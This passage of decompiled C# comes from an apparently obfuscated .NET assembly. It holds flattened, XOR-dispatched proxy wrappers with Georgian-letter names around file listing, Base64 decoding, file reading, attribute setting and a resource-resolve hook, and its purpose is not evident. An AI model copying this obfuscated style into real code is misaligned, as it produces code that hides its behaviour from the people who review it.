      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 51:
            num1 = 0;
            break;
          default:
            num1 = 5;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
            case 6:
              goto label_8;
            case 4:
              num2 = 7;
              continue;
            case 5:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴃ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return obj0.Assembly;
      }

      [SecuritySafeCritical]
      internal static object Ⴄ(
        [In] ResourceManager obj0,
        [In] string obj1,
        [In] CultureInfo obj2,
        [In] int obj3,
        [In] int obj4)
      {
label_3:
        int num1;
        switch (obj4 ^ obj3)
        {
          case 2:
            num1 = 0;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_8;
            case 1:
            case 6:
            case 7:
              num2 = 5;
              continue;
            case 4:
              num2 = 5;
              continue;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴄ);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.GetObject(obj1, obj2);
      }

      [SecuritySafeCritical]
      internal static string Ⴐ([In] string obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 36:
            num1 = 1;
            break;
          case 37:
            num1 = 5;
            break;
          case 38:
            num1 = 7;
            break;
          case 39:
            num1 = 2;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_11;
            case 2:
            case 6:
              goto label_14;
            case 4:
              num2 = 9;
              continue;
            case 5:
              goto label_12;
            case 7:
              goto label_13;
            case 8:
            case 10:
              num2 = 9;
              continue;
            case 9:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴐ);
              num2 = 9;
              continue;
          }
        }
label_11:
        return obj0.ToLower();
label_12:
        return Path.GetExtension(obj0);
label_13:
        return Path.GetFileName(obj0);
label_14:
        return Path.GetPathRoot(obj0);
      }

      [SecuritySafeCritical]
      internal static void Ⴈ([In] FileSystemInfo obj0, [In] FileAttributes obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              goto label_7;
            case 1:
            case 3:
              num1 = 4;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 13:
                  num2 = 0;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Attributes = obj1;
      }

      [SecuritySafeCritical]
      internal static string Ⴅ([In] string obj0, [In] string obj1, [In] string obj2, [In] int obj3, [In] int obj4)
      {
label_3:
        int num1;
        switch (obj4 ^ obj3)
        {
          case 83:
            num1 = 3;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_8;
            case 1:
            case 4:
              goto label_3;
            case 2:
            case 5:
              num2 = 4;
              continue;
            case 6:
              num2 = 4;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴅ);
              num2 = 4;
              continue;
          }
        }
label_8:
        return obj0 + obj1 + obj2;
      }

      [SecuritySafeCritical]
      internal static string[] Ⴀ([In] string obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 70:
            num1 = 7;
            break;
          case 71:
            num1 = 8;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_3;
            case 2:
              num2 = 3;
              continue;
            case 6:
              num2 = 3;
              continue;
            case 7:
              goto label_9;
            case 8:
              goto label_10;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴀ);
              num2 = 3;
              continue;
          }
        }
label_9:
        return Directory.GetFiles(obj0);
label_10:
        return Directory.GetDirectories(obj0);
      }

      [SecuritySafeCritical]
      internal static void Ⴍ([In] Stream obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 4:
              num1 = 0;
              continue;
            case 2:
              goto label_9;
            case 3:
            case 5:
              goto label_7;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 29:
                  num2 = 5;
                  break;
                case 30:
                  goto label_8;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_9:
        return;
label_7:
        obj0.Flush();
        return;
label_8:
        obj0.Close();
      }

      [SecuritySafeCritical]
      internal static string Ⴓ([In] int obj0, [In] int obj1)
      {
label_3:
        int num1;
        switch (obj1 ^ obj0)
        {
          case 83:
            num1 = 4;
            break;
          case 84:
            num1 = 0;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_10;
            case 2:
            case 4:
            case 5:
              goto label_9;
            case 3:
              num2 = 8;
              continue;
            case 6:
              num2 = 8;
              continue;
            case 8:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴓ);
              num2 = 8;
              continue;
          }
        }
label_9:
        return Environment.SystemDirectory;
label_10:
        return Path.GetTempPath();
      }

      [SecuritySafeCritical]
      internal static string Ⴗ([In] FileSystemInfo obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 94:
            num1 = 7;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
              goto label_3;
            case 3:
              num2 = 1;
              continue;
            case 4:
              num2 = 1;
              continue;
            case 5:
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴗ);
              num2 = 1;
              continue;
          }
        }
label_8:
        return obj0.Name;
      }

      [SecuritySafeCritical]
      internal static Assembly Ⴜ([In] int obj0, [In] int obj1)
      {
label_3:
        int num1;
        switch (obj1 ^ obj0)
        {
          case 15:
            num1 = 7;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
            case 5:
              goto label_3;
            case 1:
            case 2:
              num2 = 0;
              continue;
            case 3:
              num2 = 0;
              continue;
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.Ⴜ);
              num2 = 0;
              continue;
          }
        }
label_8:
        return Assembly.GetExecutingAssembly();
      }

      [SecuritySafeCritical]
      internal static byte[] ႤႣ([In] string obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 103:
            num1 = 4;
            break;
          case 104:
            num1 = 1;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 8:
              goto label_10;
            case 3:
              goto label_3;
            case 4:
              goto label_9;
            case 5:
              num2 = 3;
              continue;
            case 7:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.ႤႣ);
              num2 = 3;
              continue;
          }
        }
label_9:
        return Convert.FromBase64String(obj0);
label_10:
        return File.ReadAllBytes(obj0);
      }

      [SecuritySafeCritical]
      internal static string ႤႤ(
        [In] string obj0,
        [In] string obj1,
        [In] string obj2,
        [In] string obj3,
        [In] int obj4,
        [In] int obj5)
      {
label_3:
        int num1;
        switch (obj5 ^ obj4)
        {
          case 11:
            num1 = 5;
            break;
          default:
            num1 = 0;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = 3;
              continue;
            case 1:
            case 2:
            case 5:
            case 6:
              goto label_8;
            case 3:
              goto label_3;
            case 7:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.ႤႤ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return obj0 + obj1 + obj2 + obj3;
      }

      [SecuritySafeCritical]
      internal static Control.ControlCollection ႤႰ([In] Control obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 120:
            num1 = 3;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              goto label_3;
            case 2:
              num2 = 0;
              continue;
            case 3:
            case 5:
              goto label_8;
            case 6:
              num2 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.ႤႰ);
              num2 = 0;
              continue;
          }
        }
label_8:
        return obj0.Controls;
      }

      [SecuritySafeCritical]
      internal static void ႤႨ([In] PictureBox obj0, [In] int obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 5:
              goto label_7;
            case 2:
              goto label_8;
            case 3:
              num1 = 4;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 10:
                  num2 = 5;
                  break;
                default:
                  num2 = 3;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.TabIndex = obj1;
      }

      [SecuritySafeCritical]
      internal static void ႤႠ()
      {
        int num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
            case 4:
              goto label_4;
            default:
              if (!Ⴐ.Ⴅ.Ⴓ.ႤႥ)
              {
                num1 = 3;
                continue;
              }
              goto label_10;
          }
        }
label_10:
        return;
label_4:
        lock (typeof (Ⴐ.Ⴅ.Ⴓ))
        {
          int num2 = 0;
          while (true)
          {
            switch (num2)
            {
              case 1:
              case 4:
                goto label_12;
              case 2:
              case 3:
                AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴐ.Ⴅ.Ⴄ.Ⴅ);
                num2 = 4;
                continue;
              case 5:
                Ⴐ.Ⴅ.Ⴓ.ႤႥ = true;
                goto case 2;
              default:
                num2 = Ⴐ.Ⴅ.Ⴓ.ႤႥ ? 4 : 5;
                continue;
            }
          }
        }
label_12:
        int num3 = 2;
        while (true)
        {
          switch (num3)
          {
            case 3:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ.ႤႠ);
              num3 = 5;
              continue;
            case 5:
              goto label_16;
            default:
              num3 = 5;
              continue;
          }
        }
label_16:;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
    private struct ႷႭ
    {
    }
  }
}
